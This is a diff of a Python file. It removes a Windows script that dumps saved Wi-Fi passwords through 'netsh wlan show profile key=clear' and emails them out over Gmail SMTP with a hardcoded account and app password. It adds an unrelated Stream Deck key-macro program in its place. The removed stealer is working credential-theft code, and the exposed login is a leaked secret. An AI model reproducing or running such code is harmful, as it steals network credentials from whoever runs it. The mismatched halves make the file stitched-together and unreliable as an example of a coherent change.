@@ -1,55 +1,76 @@
-import subprocess
-import subprocess as sp
-from xml.dom import minidom
-from time import sleep
-import platform as pf
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
+import streamdeck
+from pynput.keyboard import Controller, Key
+import time
 
-def extract_wifi_password():
-    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('cp866').split('\n')
-    #print(profiles_data)
+# Initialize keyboard controller
+keyboard = Controller()
 
-    profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]
-    #print(profiles)
+# --- User Configuration ---
+# You'll need to find your Stream Deck device.
+# If you have multiple Stream Decks, you might need to iterate through them.
+# For simplicity, we'll assume the first found device.
+DEVICE_INDEX = 0
 
-    temp = []
+# The index of the button you want to use as a trigger (0-indexed)
+TRIGGER_BUTTON_INDEX = 0  # Example: Top-left button
 
-    for profile in profiles:
-        profile_info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear').decode('cp866').split('\n')
-        #print(profile_info)
-        try:
-            password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
-        except IndexError:
-            password = None
-        #print(f'Сеть: {profile}, Пароль: {password}')
+# The keys to press after the trigger is activated
+KEYS_TO_PRESS = ['x', '1', '2', '3', '4', '5', '6']
 
-        temp.append(f'Сеть: {profile}, Пароль: {password}\n')
+# --- Helper Functions ---
 
-    result = '=================\nПолученные данные\n=================\n'
+def press_keys_sequence(keys):
+    """
+    Presses a sequence of keys with a small delay between each.
+    """
+    print(f"Pressing keys: {keys}")
+    for key in keys:
+        if len(key) == 1: # Regular character
+            keyboard.press(key)
+            keyboard.release(key)
+        else: # Special key (e.g., Key.enter) - not directly used in this example but good practice
+            keyboard.press(getattr(Key, key))
+            keyboard.release(getattr(Key, key))
+        time.sleep(0.1)  # Small delay between key presses
 
-    result = result + ''.join(temp)
-    return result
+# --- Main Application Logic ---
 
-def send_mail():
-    sender = 'sender122135@gmail.com'
-    password = 'tira omxk ggfu vyeo'
+def run_streamdeck_application():
+    decks = streamdeck.DeviceManager().enumerate()
 
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    message = extract_wifi_password()
-    msg = MIMEText(message)
+    if not decks:
+        print("No Stream Deck devices found.")
+        return
+
+    deck = decks[DEVICE_INDEX]
+    print(f"Found Stream Deck: {deck.id()} (Product: {deck.product_name()})")
+
+    deck.open()
+    deck.reset()
+
+    print(f"Listening for presses on button {TRIGGER_BUTTON_INDEX}...")
+
+    @deck.set_key_callback(TRIGGER_BUTTON_INDEX)
+    def key_callback(deck, key, state):
+        """
+        Callback function for when a Stream Deck button is pressed or released.
+        """
+        if state:  # Button is pressed
+            print(f"Button {key} pressed. Triggering key sequence...")
+            press_keys_sequence(KEYS_TO_PRESS)
+        else:  # Button is released
+            print(f"Button {key} released.")
+
+    # Keep the application running to listen for events
     try:
-        server.login(user=sender, password=password)
-        server.sendmail(sender, sender, msg=f'{msg}')
-        print('Сообщение доставлено! :)')
-    except:
-        print('Сообщение не доставлено :(')
+        # A simple loop to keep the script alive. The callback handles events.
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Application stopped by user.")
+    finally:
+        deck.close()
+        print("Stream Deck closed.")
 
-
-def main():
-    send_mail()
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    run_streamdeck_application()
